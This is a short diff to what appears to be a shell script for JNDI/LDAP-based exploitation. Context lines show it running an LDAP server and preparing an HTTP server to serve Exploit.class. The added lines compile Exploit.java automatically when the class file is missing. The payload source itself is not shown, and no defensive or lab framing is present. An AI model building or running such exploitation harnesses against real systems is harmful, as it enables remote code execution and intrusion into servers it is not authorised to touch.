@@ -53,6 +53,14 @@ LDAP_PID=$!
 echo "[+] LDAP server running (PID: $LDAP_PID)"
 
 # 7. Validate and start HTTP server
+
+if [ ! -f "$EXPLOIT_DIR/Exploit.class" ]; then
+    echo "[*] Compiling Exploit.java..."
+    cd "$EXPLOIT_DIR"
+    javac -source 8 -target 8 Exploit.java
+    echo "[+] Exploit.java compiled."
+fi
+
 if [ ! -f "$EXPLOIT_DIR/Exploit.class" ]; then
     echo "[-] Exploit.class not found in $EXPLOIT_DIR"
     echo "    -> Compile it with: javac -source 8 -target 8 Exploit.java"
